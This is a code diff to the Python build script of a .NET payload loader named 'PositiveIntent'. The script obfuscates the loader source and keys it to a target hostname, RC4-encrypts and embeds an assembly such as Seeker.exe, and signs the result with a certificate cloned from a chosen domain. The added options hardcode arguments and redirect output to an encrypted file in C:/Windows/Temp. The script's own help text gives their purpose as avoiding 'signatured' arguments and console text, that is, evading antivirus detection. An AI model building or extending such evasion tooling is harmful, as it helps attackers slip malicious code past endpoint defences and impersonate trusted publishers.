@@ -85,18 +85,29 @@ if __name__=="__main__":
     # parse arguments
     parser = argparse.ArgumentParser(description='PositiveIntent .NET Loader')
     parser.add_argument('--file', type=argparse.FileType('rb'),
-                        required=True, help='Path to your .NET assembly (e.g. Seeker.exe)')
+                        required=True, help='Path to your .NET assembly (e.g. Seeker.exe).')
     parser.add_argument('--hostname', type=str, required=True,
-                        help='Restrict execution of loader to hostname')
+                        help='Restrict execution of loader to hostname.')
     parser.add_argument('--domain', type=str, required=True,
                         help='Domain to copy certificate from. Used to generate a self-signed certificate and digitally sign the loader.')
+    parser.add_argument('--args', type=str, required=False,
+                        help='Hardcoded arguments to be passed to your assembly. Useful to avoid passing signatured arguments on the command line.')
+    parser.add_argument('--writetofile', action='store_true', required=False,
+                        help='Redirect output of assembly to encrypted file (C:/Windows/Temp/log.txt). Useful to avoid outputting signatured text to console (e.g. tool logos).')
     args = parser.parse_args()
-
+   
     # obfuscate loader source
     # key on hostname
     # randomize assembly name
     try:
-        assembly_name = obfuscate.run(args.hostname)
+        if(args.args and not args.writetofile):
+            assembly_name, key = obfuscate.run(args.hostname, args.args, None)
+        elif(args.writetofile and not args.args):
+            assembly_name, key = obfuscate.run(args.hostname, None, args.writetofile)
+        elif(args.args and args.writetofile):
+            assembly_name, key = obfuscate.run(args.hostname, args.args, args.writetofile)
+        else:
+            assembly_name, key = obfuscate.run(args.hostname, None, None)
         print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Obfuscated loader source files')
         print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Keyed on hostname {args.hostname}')
         print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f"Randomized loader filename")
@@ -107,8 +118,10 @@ if __name__=="__main__":
 
     # encrypt .NET assembly and embed as a resource file
     try:
-        rc4.run(args.file)
+        rc4.run(args.file, key.encode('utf-8'))
         print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f"Encrypted and embedded {args.file.name} as a resource file")
+        if(args.writetofile):
+            print(colorama.Fore.BLUE + "[*] " + colorama.Style.RESET_ALL + f"Your decryption key is {key}")
     except Exception as exception: # we're really doing this
         print(colorama.Fore.RED + "[-] " + colorama.Style.RESET_ALL + f'Failed to encrypt and embed .NET assembly')
         print(traceback.print_exc())
@@ -125,7 +138,7 @@ if __name__=="__main__":
     # digitally sign loader executable
     try:
         sign.run(args.domain, assembly_name)
-        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Digitally signed loader with certificate cloned from {args.domain}')
+        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Signed loader with certificate cloned from {args.domain}')
         print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + 'Loader compiled to ' + os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), f"temp/{assembly_name}.exe")))
     except Exception as exception:
         print(colorama.Fore.RED + "[-] " + colorama.Style.RESET_ALL + f'Failed to digitally sign loader')
